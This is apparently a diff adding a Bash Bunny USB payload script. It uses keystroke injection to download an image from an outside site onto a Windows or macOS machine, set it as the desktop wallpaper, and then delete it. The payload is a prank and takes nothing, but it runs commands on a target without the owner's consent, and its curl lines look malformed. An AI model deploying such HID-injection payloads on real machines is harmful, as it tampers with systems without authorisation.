@@ -1,0 +1,63 @@
+#!/bin/bash
+###############################################################################
+# Title       : Tellibunny                                                    #       
+# Author      : Abel Gancsos                                                  #
+# Version     : v. 1.0.0.0                                                    #
+# Target      : Windows,macOS                                                 #
+# Description : Changes the desktop background.                               #
+#-----------------------------------------------------------------------------#
+# Green  : Next stage                                                         #
+# Yellow : Waiting                                                            #
+# Blue   : Active                                                             #
+###############################################################################
+LED STARTUP
+ATTACKMODE AUTO_ETHERNET HID
+GET "SWITCH_POSITION"
+GET "TARGET_PLATFORM"
+NAME=sysinfo
+REMOTE_PLATFORM=$TARGET_PLATFORM
+ISEXT=1
+LOOT_PATH="/root/exdisk/loot/$SWITCH_POSITION/$NAME"
+IMAGE_URL="https://metro.co.uk/wp-content/uploads/2021/02/SEI_13640033-e1613576699320.jpg?quality=90&strip=all&zoom=1&resize=644%2C457a"
+IMAGE_NAME="tellibunny.jpg"
+
+if [ "$(ls /dev/mmcblk0p1 | wc -l)" == "0" ]; then
+    LOOT_PATH="/root/udisk/loot/$SWITCH_POSITION/$NAME"
+    ISEXT=0
+fi
+
+if [ "$ISEXT" == "1" ]; then
+    mount -t msdos -o rw /dev/mmcblk0p1 /root/exdisk
+fi
+if [ ! -d "$LOOT_PATH" ]; then
+    mkdir -p "$LOOT_PATH"
+fi
+rm -fr $LOOT_PATH/*
+LOG_PATH="$LOOT_PATH/log.txt"
+
+LED ATTACK
+case $REMOTE_PLATFORM in
+    "MAC")
+        BUNNY_RUN "MAC" 500 "echo "" || curl -O ~/Downloads/$IMAGE_NAME $IMAGE_URL"
+        BUNNY_RUN "MAC" 500 "osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"\$HOME/Downloads/$IMAGE_NAME\"'"
+        ;;
+    "WIN")
+        BUNNY_RUN "WIN" 500 "echo "" || curl -O ~/Downloads/$IMAGE_NAME $IMAGE_URL"
+        BUNNY_RUN "WIN" 500 "powershell.exe -c \"Set-ItemProperty -path 'HKCU:\\Control Panel\Desktop\\' -name wallpaper -value \$(\$env:USERPROFILE)\\Downloads\\$IMAGE_NAME; rundll32.exe user32.dll, UpdatePerUserSystemParameters\""
+        ;;
+    *) ;;
+esac
+
+LED CLEANUP
+case $REMOTE_PLATFORM in
+    "MAC")
+        BUNNY_RUN "MAC" 500 "rm -f \$HOME/Downloads/$IMAGE_NAME"
+        ;;
+    "WIN")
+        BUNNY_RUN "WIN" 500 "del /F %USERPROFILE%\\Downloads\\$IMAGE_NAME"
+        ;;
+    *) ;;
+esac
+
+LED FINISH
+LED B 20
